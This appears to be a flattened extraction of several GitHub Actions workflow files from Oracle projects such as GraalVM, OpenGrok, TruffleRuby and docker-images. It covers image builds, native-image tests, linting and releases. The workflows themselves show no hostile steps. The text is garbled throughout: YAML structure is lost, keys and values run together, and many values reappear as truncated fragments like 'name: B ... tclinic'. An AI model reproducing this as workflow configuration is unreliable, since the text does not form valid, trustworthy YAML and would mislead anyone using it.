/home/huawei/github-actions-security/.github/workflows/oracle_docker-images__build-and-push-nosql-image.ymlBuild and publish NoSQL container image to GitHub Container RegistryNoSQL/ce/*'NoSQL/ce/*'.github/workflows/build-and-push-nosql-image.yml'.githu ... ge.yml'- 'NoSQL/ce/*'nosqlIMAGE_NAME: nosqlBuild and push NoSQL ce imageBuild a ... e imagegithub.event_name == 'push'github. ...  'push'REPO_OWNER="${{ github.repository_owner }}"
echo "repo-owner=${REPO_OWNER,,}" >> "$GITHUB_OUTPUT"
Get current datedateecho "date=$(date +'%Y-%m')" >> "$GITHUB_OUTPUT"echo "d ... OUTPUT"name: G ... nt dateLogin to Docker Hubname: L ... ker HubGenerate container image metadatametadocker/metadata-action@v5docker/ ... tion@v5ghcr.io/${{ steps.repo-owner.outputs.repo-owner }}/${{ env.IMAGE_NAME }}ghcr.io ... NAME }}flavorlatest=false
type=raw,value=latest-ce
type=raw,value=${{ env.TAG }}
images: ... NAME }}${{ steps.date.outputs.date }}-ce${{ ste ... e }}-ceTAG: ${ ...  }}-ce Build and push./NoSQL/ce/linux/amd64,linux/arm64linux/a ... x/arm64${{ steps.meta.outputs.tags }}${{ ste ... tags }}${{ steps.meta.outputs.labels }}${{ ste ... bels }}context: ./NoSQL/ce/name: Build and push-name: B ... e image/home/huawei/github-actions-security/.github/workflows/oracle_docker-images__build-and-push-nosql-sec-image.ymlBuild and publish NoSQL secure container image to GitHub Container RegistryNoSQL/ce-sec/*'NoSQL/ce-sec/*'.github/workflows/build-and-push-nosql-sec-image.yml- 'NoSQL/ce-sec/*'type=raw,value=latest-ce-sec
type=raw,value=${{ env.TAG }}
${{ steps.date.outputs.date }}-ce-sec${{ ste ... -ce-secTAG: ${ ... -ce-sec./NoSQL/ce-sec/context ... ce-sec//home/huawei/github-actions-security/.github/workflows/oracle_docker-images__build-and-push-oci-cli-image.ymlBuild and Push OCI CLI ImageBuild a ... I Image30 0 * * 3'30 0 * * 3'cron: ' ... h30 UTC- cron: ... h30 UTCOracleCloudInfrastructuree/oci-cli/*'Oracle ... -cli/*'.github/workflows/build-and-push-oci-cli-image.yml- 'Orac ... -cli/*'oci-cliIMAGE_NAME: oci-cliSetup Docker BuildXname: S ...  BuildXecho "repo-owner=$(echo '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_OUTPUT"
github.event_name != 'pull_request'latest=true
provider=${REPO_OWNER}
issues=https://github.com/${{ steps.repo-owner.outputs.repo-owner }}/docker-images/issues
org.opencontainers.image.licenses=UPL-1.0
org.opencontainers.image.vendor=${REPO_OWNER}
org.opencontainers.image.title=OCI CLI
org.opencontainers.image.description=Oracle Cloud Infrastructure Command Line Interface
org.opencontainers.image.source=https://github.com/oracle/docker-images/tree/main/OracleCloudInfrastructure/oci-cli
org.opencontainers.image.documentation=https://docs.oracle.com/en-us/iaas/Content/API/Concepts/cliconcepts.htm
org.opencontainers.image.url=https://github.com/${{ steps.repo-owner.outputs.repo-owner }}/docker-images/pkgs/container/oci-cli
org.opencontainers.image.base.name=ghcr.io/${{ steps.repo-owner.outputs.repo-owner }}/oci-cli:latest
type=schedule,pattern={{date 'YYYYMMDD'}}
type=sha
Build and push imagebuild-and-pushBUILDTIME=${{ fromJSON(steps.meta.outputs.json).labels['org.opencontainers.image.created'] }}
VERSION=${{ fromJSON(steps.meta.outputs.json).labels['org.opencontainers.image.version'] }}
REVISION=${{ fromJSON(steps.meta.outputs.json).labels['org.opencontainers.image.revision'] }}
./OracleCloudInfrastructure/oci-cli/./Oracl ... ci-cli/linux/amd64, linux/arm64build-args: |name: B ... h imagename: B ... I Image/home/huawei/github-actions-security/.github/workflows/oracle_docker-images__super-linter.ymlLint new or modified files using Super LinterLint ne ...  Linterlint-new-modified-fileslint-ne ... d-filesLint new or modified filesLint ne ... d filesCheckout Git repository with historyCheckou ... historyname: C ... historySet environment variablesSet env ... riablescat .github/super-linter.env >> "$GITHUB_ENV"cat .gi ... UB_ENV"name: S ... riablesRun Super Lintergithub/super-linter/slim@v7github/ ... slim@v7DEFAULT_BRANCHDEFAULT_BRANCH: mainname: R ...  Linter- name: ... historylint-ne ... -files:name: L ...  Linter/home/huawei/github-actions-security/.github/workflows/oracle_graal__cdt-inspect.ymlWeekly CDT Inspector30 2 * * 2,5"30 2 * * 2,5"cron: " ... at 2:30- cron: ... at 2:30JAVA_HOME${{ github.workspace }}/jdk${{ git ...  }}/jdkJDK_VERSION"latest"MX_PATH${{ github.workspace }}/mx${{ git ... e }}/mxSE_SKIP_DRIVER_IN_PATHSE_SKIP ... IN_PATHJAVA_HO ...  }}/jdkgithub.repository == 'oracle/graal'github. ... /graal'Checkout oracle/graalCheckou ... e/graal${{ github.workspace }}/graal${{ git ... }/graalpath: $ ... }/graalname: C ... e/graalCheckout oracle/graaljsCheckou ... graaljsoracle/graaljsgraal-js
${{ github.workspace }}/js${{ git ... e }}/jsreposit ... graaljsname: C ... graaljsCheckout graalvm/mxgraalvm/mx.git${{ env.MX_PATH }}reposit ... /mx.gitname: C ... alvm/mx'3.8'python- ... : '3.8'Fetch LabsJDKmkdir jdk-dl
${MX_PATH}/mx --java-home= fetch-jdk --jdk-id labsjdk-ce-${JDK_VERSION} --to jdk-dl --alias ${JAVA_HOME}
name: Fetch LabsJDKcd ${{ github.workspace }}/graal/vm
${MX_PATH}/mx --dy /tools,graal-js build
cd tests/gh_workflows/CDTInspectorTest
mvn -q compile
mvn -q exec:exec -Dtestargs="${{ github.workspace }}/graal/sdk/latest_graalvm_home/bin/js scripts/StepTest.js"
- name: ... e/graalname: W ... spector/home/huawei/github-actions-security/.github/workflows/oracle_graal__main.ymlGraalVM Gate- 'release/**'.github/workflows/quarkus.yml'.githu ... us.yml'**.jsonnet'**.jsonnet'**.libjsonnet'**.libjsonnet'- '.devcontainer/**'30 0 * * 1'30 0 * * 1'cron: '30 0 * * 1'- cron: '30 0 * * 1'workflow = ${{ github.workflow }}, ref = ${{ github.event.ref }}, pr = ${{ github.event.pull_request.id }}"workfl ... .id }}"${{ github.event_name == 'pull_request' || github.repository != 'oracle/graal' }}${{ git ... aal' }}group:  ... .id }}"TOOLS_JAVA_HOME_LOCATIONTOOLS_J ... OCATION${{ github.workspace }}/tools-jdk${{ git ... ols-jdkLANGen_US.UTF-8MX_GIT_CACHErefcacheMX_PYTHONpython3.8NATIVE_IMAGE_EXPERIMENTAL_OPTIONS_ARE_FATALNATIVE_ ... E_FATALbuild-graalvm-linux/${{ matrix.env.PRIMARY }} ${{ matrix.env.GATE_TAGS }} JDK${{ matrix.env.JDK_VERSION }}/${{ ma ... SION }}${{ matrix.os || 'ubuntu-22.04' }}${{ mat ... .04' }}TOOLS_JDK_VERSION"21"GATE_TAGSstyle,fullbuild,test"style, ... d,test"PRIMARY"compiler"JDK_VER ... latest"build,bootstraplite"build, ... aplite"style,fullbuild"style,fullbuild"espresso"espresso"JDK_VERSION: "21"substratevm"substratevm"build,helloworld,native_unittests"build, ... ttests"PIP_PACKAGESjsonschema==4.6.1"jsonschema==4.6.1"build,debuginfotest"build, ... fotest"os: ubuntu-24.04hellomodule"hellomodule"style,fullbuild,sulongBasic"style, ... gBasic"sulong"sulong"style,fullbuild,fulltest"style, ... lltest"truffle"truffle"build,sulong"build,sulong"GATE_OPTS--no-warning-as-error"--no-w ... -error"vm"vm"DYNAMIC_IMPORTS/sulong,/substratevm"/sulon ... ratevm"NATIVE_IMAGESgraalvm-native-binutil,graalvm-native-clang,graalvm-native-clang-cl,graalvm-native-clang++,graalvm-native-ld,lib:llvmvm"graalv ... llvmvm"DISABLE_POLYGLOTDISABLE_LIBPOLYGLOT"build"/tools,/substratevm,/sulong"/tools ... sulong"lib:jvmcicompiler,native-image,lib:native-image-agent,lib:native-image-diagnostics-agent,polyglot"lib:jv ... lyglot"WITHOUT_VCS- env:JDTbuiltinMX_RUNS_DEBUG${{ contains(matrix.env.GATE_TAGS, 'debug') || matrix.env.GATE_TAGS == '' }}${{ con ... = '' }}MX_RUNS_STYLE${{ contains(matrix.env.GATE_TAGS, 'style') || matrix.env.GATE_TAGS == '' }}JDT: bu ... lbuild'${{ env.MX_RUNS_STYLE && '0' || '1' }}"${{ en ... '1' }}"ref: ${ ...  othersDetermine mx versionecho "MX_VERSION=$(jq -r '.mx_version' common.json)" >> ${GITHUB_ENV}echo "M ... UB_ENV}${{ env.MX_VERSION }}${{ env ... SION }}${{ matrix.env }}Fetch Tools JDK${{ matrix.env.TOOLS_JDK_VERSION != '' }}${{ mat ... = '' }}${MX_PATH}/mx --java-home= fetch-jdk --jdk-id labsjdk-ce-${TOOLS_JDK_VERSION} --to jdk-dl --alias ${TOOLS_JAVA_HOME_LOCATION}
name: F ... ols JDKUpdate dependency cacheUpdate  ... y cache${{ env.MX_RUNS_DEBUG == 'true' || env.MX_RUNS_STYLE == 'true' }}${{ env ... rue' }}sudo apt updatename: U ... y cacheInstall debug dependencies${{ env.MX_RUNS_DEBUG == 'true' }}sudo apt install gdbInstall style dependencies${{ env.MX_RUNS_STYLE == 'true' }}sudo apt install python3-pip python-setuptools
sudo pip install $(jq -r '[.pip | to_entries[] | join("")] | join(" ")' common.json)
Install additional pip packagesInstall ... ackages${{ matrix.env.PIP_PACKAGES != '' }}${MX_PYTHON} -m pip install ${{ matrix.env.PIP_PACKAGES }}${MX_PY ... AGES }}name: I ... ackagesDownload EclipseECLIPSE_TAR=eclipse.tar.gz
ECLIPSE_ORG_VERSION=$(jq -r '.eclipse.short_version' common.json)
ECLIPSE_ORG_TIMESTAMP=$(jq -r '.eclipse.timestamp' common.json)
wget --no-verbose https://archive.eclipse.org/eclipse/downloads/drops4/R-${ECLIPSE_ORG_VERSION}-${ECLIPSE_ORG_TIMESTAMP}/eclipse-SDK-${ECLIPSE_ORG_VERSION}-linux-gtk-x86_64.tar.gz -O $ECLIPSE_TAR
tar -xzf ${ECLIPSE_TAR}
echo "ECLIPSE_EXE=${PWD}/eclipse/eclipse" >> $GITHUB_ENV
name: D ... EclipseRemove .git directoryRemove  ... rectory${{ matrix.env.WITHOUT_VCS }}${{ mat ... _VCS }}rm -rf .gitname: R ... rectoryBuild GraalVM and run gate with tagsBuild G ... th tags${MX_PATH}/mx --primary-suite-path ${PRIMARY} --java-home=${JAVA_HOME} --tools-java-home=${{ matrix.env.TOOLS_JDK_VERSION != '' && env.TOOLS_JAVA_HOME_LOCATION || '' }} gate --strict-mode ${{ matrix.env.GATE_OPTS }} --tags ${GATE_TAGS}${MX_PA ... E_TAGS}${{ matrix.env.GATE_TAGS != '' }}name: B ... th tagsBuild GraalVM and run gate without tagsBuild G ... ut tags${MX_PATH}/mx --primary-suite-path ${PRIMARY} --java-home=${JAVA_HOME} gate --strict-mode ${{ matrix.env.GATE_OPTS }}${MX_PA ... OPTS }}${{ matrix.env.GATE_TAGS == '' }}name: B ... ut tagsname: / ... SION }}build-graalvm-windowsbuild-g ... windows/substratevm on Windows/substr ... Windows'python'PYTHONIOENCODINGutf-8'utf-8'MX_PYTHON: 'python'mkdir jdk-dl
${MX_PATH}/mx --java-home= fetch-jdk --jdk-id labsjdk-ce-latest --to jdk-dl --alias ${JAVA_HOME}
Build GraalVM via cmd.exeBuild G ... cmd.execall "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" x64
call ${{ env.MX_PATH }}\mx.cmd -p substratevm --native-images=native-image --components="Native Image" build
call ${{ env.MX_PATH }}\mx.cmd -p substratevm --native-images=native-image --components="Native Image" graalvm-home > graalvm-home-with-forward-slashes.txt
set /p GRAALVM_HOME=<graalvm-home-with-forward-slashes.txt
setlocal enabledelayedexpansion
set "GRAALVM_HOME=%GRAALVM_HOME:/=\%"
echo %GRAALVM_HOME%\bin>>%GITHUB_PATH%
echo GRAALVM_HOME=%GRAALVM_HOME%>>%GITHUB_ENV%
name: B ... cmd.exeTest GraalVMnative-image --version
native-image -m jdk.httpserver
name: Test GraalVMname: / ... Windowsbuild-graalvm-linux:name: GraalVM Gate/home/huawei/github-actions-security/.github/workflows/oracle_graal__micronaut.ymlWeekly Micronaut TestsWeekly  ... t Tests.github/workflows/micronaut.yml'.githu ... ut.yml'- '.git ... ut.yml'0 2 * * 1'0 2 * * 1'cron: '0 2 * * 1'- cron: '0 2 * * 1'MICRONAUT_CORE_PATH${{ github.workspace }}/micronaut-core${{ git ... ut-coreMICRONAUT_JAVA_VERSIONMICRONA ... VERSIONMICRONA ... ut-corebuild-graalvm-and-micronautbuild-g ... cronautNative Tests(github.event_name == 'schedule' && github.repository == 'oracle/graal') || (github.event_name != 'schedule')(github ... edule')Build GraalVM JDK./.github/actions/build-graalvm./.gith ... graalvm${{ env.MICRONAUT_JAVA_VERSION }}java-ve ... SION }}name: B ... lVM JDKRun nativeTest in Micronaut launch projectRun nat ... projectcurl --fail --silent --location --retry 3 --max-time 10 --output demo.zip --request GET 'https://launch.micronaut.io/create/default/com.example.demo?lang=JAVA&build=GRADLE&test=JUNIT&javaVersion=JDK_${{ env.MICRONAUT_JAVA_VERSION }}'
unzip demo.zip
cd demo
./gradlew nativeTest
Checkout micronaut-projects/micronaut-coreCheckou ... ut-coremicronaut-projects/micronaut-coremicrona ... ut-core${{ env.MICRONAUT_CORE_PATH }}${{ env ... PATH }}reposit ... ut-corename: C ... ut-coreRun nativeTest in micronaut-coreRun nat ... ut-corecd ${{ env.MICRONAUT_CORE_PATH }}
./gradlew nativeTest
name: R ... ut-corename: Native Testsbuild-g ... ronaut:name: W ... t Tests/home/huawei/github-actions-security/.github/workflows/oracle_graal__ni-layers.ymlWeekly Native Image Layer Building TestsWeekly  ... g Tests.github/workflows/ni-layers.yml'.githu ... rs.yml'vm/tests/gh_workflows/NILayerTests/**'vm/tes ... sts/**'- '.git ... rs.yml'"0 0 * * 1"cron: " ... 00 UTC)- cron: ... 00 UTC)LIBRARY_METADATA_PATHLIBRARY ... TA_PATH${{ github.workspace }}/vm/tests/gh_workflows/NILayerTests${{ git ... erTestsJAVA_VERSIONPYTHON_VERSIONLIBRARY ... erTestsbuild-graalvm-and-populate-matrixbuild-g ... -matrixBuild GraalVM and populate matrixBuild G ...  matrix(github.repository=='oracle/graal')(github ... graal')native-imagesnative-image,native-image-configure,lib:native-image-agent'native ... -agent'componentsNative Image,Native Image Configure Tool'Native ... e Tool'${{ env.JAVA_VERSION }}native- ... -agent'Tar GraalVM JDKtar -czvhf graalvm.tgz -C $(dirname ${GRAALVM_HOME}) $(basename ${GRAALVM_HOME})tar -cz ... _HOME})name: T ... lVM JDKPersist GraalVM JDK buildPersist ... K buildgraalvmgraalvm.tgzname: graalvmname: P ... K buildSetup python${{ env.PYTHON_VERSION }}python- ... ION }}'name: Setup pythonPopulate matrixpython3 ${{ env.LIBRARY_METADATA_PATH }}/build_native_image_layer.py ${{ env.LIBRARY_METADATA_PATH }}/python3 ... ATH }}/name: P ...  matrixtest-native-image-layer-buildtest-na ... r-build${{ matrix.coordinates }}${{ mat ... ates }}GRAALVM_HOME${{ github.workspace }}/graalvm${{ git ... graalvmGRAALVM ... graalvmcoordinates${{ fromJson(needs. build-graalvm-and-populate-matrix.outputs.matrix).coordinates }}${{ fro ... ates }}coordin ... ates }}Download GraalVM JDK buildDownloa ... K buildactions/download-artifact@95815c38cf2ff2164869cbab79da8d1f422bc89eactions ... 22bc89ename: D ... K buildExtract GraalVM JDK buildExtract ... K buildtar -xzvf graalvm.tgz -C $(dirname ${GRAALVM_HOME})tar -xz ... _HOME})name: E ... K buildSetup JAVA_HOME"Setup JAVA_HOME"oracle'oracle'distrib ... oracle'name: " ... A_HOME"Build layerpython3 ${{ env.LIBRARY_METADATA_PATH }}/build_native_image_layer.py ${{ env.GRAALVM_HOME }}/bin/native-image "${{ matrix.coordinates }}"
name: Build layername: $ ... ates }}build-g ... matrix:name: W ... g Tests/home/huawei/github-actions-security/.github/workflows/oracle_graal__quarkus.ymlWeekly Quarkus Tests- '.git ... us.yml'0 3 * * 1'0 3 * * 1'cron: '0 3 * * 1'- cron: '0 3 * * 1'COMMON_MAVEN_ARGS-e -B --settings .github/mvn-settings.xml --fail-at-end"-e -B  ... at-end"DB_NAMEhibernate_orm_testDB_PASSWORDDB_USERNATIVE_TEST_MAVEN_ARGSNATIVE_ ... EN_ARGS-Dtest-containers -Dstart-containers -Dquarkus.native.native-image-xmx=6g -Dnative -Dnative.surefire.skip -Dformat.skip -Dno-descriptor-tests install -DskipDocs -Dquarkus.native.container-build=false"-Dtest ... =false"QUARKUS_JAVA_VERSIONQUARKUS_PATH${{ github.workspace }}/quarkus${{ git ... quarkusCOMMON_ ... at-end"build-quarkus-and-graalvmbuild-q ... graalvmNightly Quarkus and GraalVM buildNightly ... M build${{ steps.read.outputs.matrix }}${{ env.QUARKUS_JAVA_VERSION }}Get latest Quarkus releaseGet lat ... releaseexport QUARKUS_VERSION=main #$(curl https://repo1.maven.org/maven2/io/quarkus/quarkus-bom/maven-metadata.xml | awk -F"[<>]" '/latest/ {print $3}')
echo Getting Quarkus $QUARKUS_VERSION
curl --output quarkus.tgz -sL https://api.github.com/repos/quarkusio/quarkus/tarball/$QUARKUS_VERSION
mkdir ${QUARKUS_PATH}
tar xf quarkus.tgz -C ${QUARKUS_PATH} --strip-components=1
name: G ... release~/.m2/repositorypath: ~ ... ositoryuses: a ... ache@v4Build Quarkuscd ${QUARKUS_PATH}
eval ./mvnw -e -B -Dquickly
name: Build QuarkusRead json file with native-tests matrixRead js ...  matrixjson=$(tr -d '\n' < ${QUARKUS_PATH}/.github/native-tests.json )
echo $json
echo "matrix=${json}" >> $GITHUB_OUTPUT
name: R ...  matrixTar Maven Repotar -czvf maven-repo.tgz -C ~ .m2/repositorytar -cz ... ositoryname: Tar Maven RepoPersist Maven Repomaven-repomaven-repo.tgzname: maven-reponame: P ... en Reponative-testsNative Tests - ${{matrix.category}}Native  ... egory}}${{matrix.timeout}}${{ fromJson(needs.build-quarkus-and-graalvm.outputs.matrix) }}max-parallel: 8startsWith(matrix.os-name, 'ubuntu')startsW ... buntu')Reclaim Disk Space${QUARKUS_PATH}/.github/ci-prerequisites.sh${QUARK ... ites.shname: R ... k SpaceDownload Maven Reponame: D ... en RepoExtract Maven Repotar -xzf maven-repo.tgz -C ~tar -xz ... gz -C ~name: E ... en RepoBuild with MavenTEST_MODULES${{matrix.test-modules}}${{matr ... dules}}TEST_MO ... dules}}cd ${QUARKUS_PATH}
${GRAALVM_HOME}/bin/native-image --version
./mvnw $COMMON_MAVEN_ARGS -f integration-tests -pl "$TEST_MODULES" $NATIVE_TEST_MAVEN_ARGS
name: B ... h MavenPrepare failure archive (if maven failed)Prepare ... failed)find . -type d -name '*-reports' -o -wholename '*/build/reports/tests/functionalTest' | tar -czf test-reports.tgz -T -find .  ... gz -T -name: P ... failed)Upload failure Archive (if maven failed)Upload  ... failed)test-reports-native-${{matrix.category}}test-re ... egory}}test-reports.tgz'test-reports.tgz'name: t ... egory}}name: U ... failed)- name: ... K buildname: N ... egory}}build-q ... raalvm:name: W ... s Tests/home/huawei/github-actions-security/.github/workflows/oracle_graal__reachability-metadata.ymlWeekly Reachability Metadata TestsWeekly  ... a Tests.github/workflows/reachability-metadata.yml'.githu ... ta.yml'- '.git ... ta.yml'0 1 * * 1'0 1 * * 1'cron: '0 1 * * 1'- cron: '0 1 * * 1'REACHABILITY_METADATA_PATHREACHAB ... TA_PATH${{ github.workspace }}/graalvm-reachability-metadata${{ git ... etadataMINIMUM_METADATA_JAVA_VERSIONMINIMUM ... VERSIONREACHAB ... etadata${{ env.MINIMUM_METADATA_JAVA_VERSION }}Checkout oracle/graalvm-reachability-metadataCheckou ... etadataoracle/graalvm-reachability-metadataoracle/ ... etadata${{ env.REACHABILITY_METADATA_PATH }}reposit ... etadataname: C ... etadata"Populate matrix"cd ${{ env.REACHABILITY_METADATA_PATH }}
./gradlew generateMatrixMatchingCoordinates -Pcoordinates=all
name: " ... matrix"test-all-metadata${{fromJson(needs.build-graalvm-and-populate-matrix.outputs.matrix).coordinates}}${{from ... nates}}coordin ... nates}}"Checko ... tadata"Pull allowed docker images"Pull a ... images"./gradlew pullAllowedDockerImages --coordinates=${{ matrix.coordinates }}
name: " ... images"Disable docker"Disable docker"sudo apt-get install openbsd-inetd
sudo bash -c "cat ./.github/workflows/discard-port.conf >> /etc/inetd.conf"
sudo systemctl start inetd
sudo mkdir /etc/systemd/system/docker.service.d
sudo bash -c "cat ./.github/workflows/dockerd.service > /etc/systemd/system/docker.service.d/http-proxy.conf"
sudo systemctl daemon-reload
sudo systemctl restart docker
name: " ... docker"Run '${{ matrix.coordinates }}' tests"Run '$ ...  tests"./gradlew test -Pcoordinates=${{ matrix.coordinates }}
- name: ... tadata"name: W ... a Tests/home/huawei/github-actions-security/.github/workflows/oracle_graal__spring.ymlWeekly Spring Tests.github/workflows/spring.yml'.githu ... ng.yml'- '.git ... ng.yml'0 4 * * 1'0 4 * * 1'cron: '0 4 * * 1'- cron: '0 4 * * 1'SPRING_PETCLINIC_PATHSPRING_ ... IC_PATH${{ github.workspace }}/spring-petclinic${{ git ... tclinicSPRING_JAVA_VERSIONSPRING_ ... tclinicbuild-graalvm-and-springbuild-g ... -spring${{ env.SPRING_JAVA_VERSION }}Checkout spring-projects/spring-petclinicCheckou ... tclinicspring-projects/spring-petclinicspring- ... tclinic${{ env.SPRING_PETCLINIC_PATH }}reposit ... tclinicname: C ... tclinicRun nativeTest in spring-petclinicRun nat ... tcliniccd ${{ env.SPRING_PETCLINIC_PATH }}
./gradlew nativeTest
name: R ... tclinicbuild-g ... spring:/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__apiary.ymlCheck Apiary blueprintCheck A ... ueprintapiary.apib- apiary.apibubuntuUbuntuCheckout master branchCheckou ...  branchInstall drafternpm install draftername: I ... drafternode dev/parse.jsname: Ubuntuubuntu:name: C ... ueprint/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__build.ymlREADME.md- README.md0 0 * * 0"0 0 * * 0"cron: "0 0 * * 0"- cron: "0 0 * * 0"${{ matrix.os }} with Java 21${{ mat ... Java 21'21'Cache Maven packages~/.m2${{ runner.os }}-m2-${{ hashFiles('**/pom.xml') }}${{ runner.os }}-m2path: ~/.m2name: C ... ackagesCheckout Universal ctagsCheckou ... l ctagsuniversal-ctags/ctagsunivers ... s/ctagsctagsreposit ... s/ctagsname: C ... l ctagsInstall pre-requisites (Unix)Install ...  (Unix)runner.os == 'Linux' || runner.os == 'macOS'./dev/before_installname: I ...  (Unix)Install Universal ctags (Windows)Install ... indows)choco install universal-ctagschoco i ... l-ctagsname: I ... indows)Before build actions./dev/beforename: B ... actionsMaven buildOPENGROK_PULL_REQUESTOPENGRO ... REQUESTOPENGROK_REPO_SLUGOPENGROK_REFOPENGROK_SONAR_TOKEN${{ secrets.SONAR_TOKEN }}OPENGRO ... _ref }}./dev/mainname: Maven buildopengrok-${{ github.sha }}-${{ matrix.os }}.tar.gzopengro ... .tar.gzdistribution/target/opengrok-*.tar.gzdistrib ... .tar.gzcompression-levelname: o ... .tar.gzname: $ ... Java 21/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__codeql-analysis.yml41 17 * * 5'41 17 * * 5'cron: '41 17 * * 5''java''javascript'[ 'java ... thon' ]languag ... thon' ]Set up JDK 17name: Set up JDK 17/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__docker.ymlBuild Docker imagePrint environmentpython3 -m pip install -r docker/requirements.txtpython3 ... nts.txtInstall opengrok-tools so that pylint can perform the checksInstall ...  checkspython3 -m pip install .python3 ... stall .name: I ...  checksInstall checkerspython3 -m pip install pylint flake8 black isortpython3 ... k isortname: I ... heckersRun flake8flake8 --max-line-length 119 docker/*.pyflake8  ... er/*.pyname: Run flake8Run pylintpylint -E --max-line-length 119 docker/*.pypylint  ... er/*.pyname: Run pylintRun black in check modeRun bla ... ck modeblack --check docker/*.pyblack - ... er/*.pyname: R ... ck modeRun isort in check modeRun iso ... ck modeisort --settings-file docker/.isort.cfg docker/*.py  --check --diffisort - ...  --diffBuild and optionally push Docker imageDOCKER_USERNAME${{ secrets.DOCKER_USERNAME }}DOCKER_PASSWORD${{ secrets.DOCKER_PASSWORD }}DOCKER_ ... NAME }}./dev/docker.shInstall Python pre-requisitesInstall ... uisitespython3 -m pip install requestspython3 ... equestsname: I ... uisitesOptionally update README on Docker hubOptiona ... ker hubOPENGRO ... tory }}./dev/dockerhub_readme.py./dev/d ... adme.pyname: O ... ker hub/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__javadoc.ymlUpload javadocs to Github pagesUpload  ... b pagesopengrok-indexer/**opengrok-web/**suggester/**plugins/**.github/workflows/javadoc.yml.github ... doc.ymldev/javadoc.sh- openg ... exer/**Checkout gh-pages branchgithub.repository == 'oracle/opengrok'github. ... engrok'gh-pagesref: gh-pagesRefresh JavadocOPENGROK_BUILD_DIR${{ github.workspace }}${{ git ... pace }}./dev/javadoc.shname: R ... Javadocname: U ... b pages/home/huawei/github-actions-security/.github/workflows/oracle_opengrok__release.ymlget_tagGet tag nametag${{ steps.get_tag.outputs.tag }}${{ ste ... .tag }}tag: ${ ... .tag }}Get the tag nameOPENGRO ... .ref }}./dev/ref2tag.shname: G ... ag namename: Get tag nameInstall pre-requisites./mvnw -DskipTests=true -Dmaven.javadoc.skip=false -B -V package./mvnw  ... packageGet upload URLget_upload_urlOPENGROK_TAG${{ needs.get_tag.outputs.tag }}${{ nee ... .tag }}OPENGRO ... .tag }}dev/get_upload_url.shdev/get ... _url.shname: Get upload URLUpload release tarballUpload  ... tarballupload-release-asset${{ steps.get_upload_url.outputs.upload_url }}./distribution/target/opengrok-${{ needs.get_tag.outputs.tag }}.tar.gz./distr ... .tar.gzopengrok-${{ needs.get_tag.outputs.tag }}.tar.gzapplication/octet-streamapplica ... -streamname: U ... tarballget_tag:/home/huawei/github-actions-security/.github/workflows/oracle_truffleruby__ci.ymlJT_JDKJT_JDK: '21'Clone TruffleRubyfetch-d ... eck_abiname: C ... fleRubySetup system Rubyruby/setup-ruby@v1name: S ... em RubySetup jtecho "$PWD/bin" >> $GITHUB_PATHname: Setup jtRestore ~/.mx/cacheactions/cache@v3~/.mx/cachemx-cache-lint-${{ runner.os }}-${{ hashFiles('common.json') }}mx-cach ... on') }}path: ~/.mx/cachename: R ... x/cache./.github/actions/setup-jvmci-graal./.gith ... i-graaluses: . ... i-graaljt install eclipserun: jt ... eclipseInstall RuboCopgem install --no-document rubocop:0.66.0gem ins ... :0.66.0name: I ... RuboCopBuild with --warning-as-error to ensure there are no non-deprecation warningsBuild w ... arningsjt build -- --jdt builtin --warning-as-error --force-deprecation-as-warningjt buil ... warningname: B ... arningsjt lintrun: jt lint- name: ... fleRubyname: lintbuild jvmworking ... : buildpath: buildmx-cache-build-${{ runner.os }}-${{ hashFiles('build/common.json') }}./build/.github/actions/setup-jvmci-graal./build ... i-graalBuild TruffleRubyjt buildname: B ... fleRubyCreate archivemv "$(jt -u jvm ruby-home)" "${{ github.workspace }}/truffleruby-jvm"
cd ${{ github.workspace }}
tar cf ${{ github.workspace }}/truffleruby-jvm.tar truffleruby-jvm
name: Create archivetruffleruby-jvm${{ github.workspace }}/truffleruby-jvm.tar${{ git ... jvm.tarname: t ... uby-jvmname: build jvmbuild_nativebuild nativemx-cache-build-native-${{ runner.os }}-${{ hashFiles('build/common.json') }}free -mrun: free -mjt build --env nativejt buil ...  nativemv "$(jt -u native ruby-home)" "${{ github.workspace }}/truffleruby-native"
cd ${{ github.workspace }}
tar cf ${{ github.workspace }}/truffleruby-native.tar truffleruby-native
truffleruby-native${{ github.workspace }}/truffleruby-native.tar${{ git ... ive.tarname: t ... -nativename: build nativefast_specsfast specs[build]echo "SYSTEM_RUBY=$(which ruby)" >> $GITHUB_ENV && echo "$PWD/bin" >> $GITHUB_PATHecho "S ... UB_PATHuses: a ...  v4.2.1./.github/actions/setup-truffleruby./.gith ... flerubyuses: . ... flerubyjt test fastrun: jt test fastjt test :nextrun: jt test :nextname: fast specsall_specsspecs ${{ matrix.specs }}specs $ ... pecs }}specs:truffle:language :core:library :cext :security :command_line :tracepoint:librar ... cepoint- :truffle # ~12minspecs:jt test --timeout 180 ${{ matrix.specs }}jt test ... pecs }}run: jt ... pecs }}name: s ... pecs }}test_integrationtest integrationjt test integrationrun: jt ... grationname: t ... grationtest_nativetest native[build_native]archivearchive ... -nativejt test compilerrun: jt ... ompilerjt test :command_linejt test ... nd_linerun: jt ... nd_linejt test :languagerun: jt ... anguagejt test fast :trufflejt test ... trufflerun: jt ... trufflename: test nativetest_mrirun MRI tests on nativerun MRI ...  nativejt test mri --fast --no-sulongjt test ... -sulongrun: jt ... -sulongname: r ...  nativeruby_spec_crubyruby/spec on CRuby ${{ matrix.ruby }}ruby/sp ... ruby }}3.1'3.1'3.2'3.2'3.3'3.3'3.4'3.4'['3.1', ...  '3.4']ruby: [ ...  '3.4']${{ matrix.ruby }}bundlerruby-ve ... ruby }}uses: r ... ruby@v1CHECK_LEAKS=true jt -u ruby mspec -fdot --timeout 30 spec/rubyCHECK_L ... ec/rubyrun: CH ... ec/rubyname: r ... ruby }}/home/huawei/github-actions-security/.github/workflows/oracle_truffleruby__prism.ymlCheck importing latest PrismCheck i ... t Prism0 13 * * *'0 13 * * *'cron: '0 13 * * *'- cron: '0 13 * * *'test-import-prismgithub.repository == 'oracle/truffleruby'github. ... leruby'BUNDLE_WITHOUTmemcheck:types"memcheck:types"BUNDLE_ ... :types"Clone Prismruby/prismprismreposit ... y/prismname: Clone Prismbundler-cacheruby-version: rubymkdir truffleruby-wsrun: mk ... ruby-wstruffleruby-ws/trufflerubytruffle ... flerubypath: t ... flerubyecho 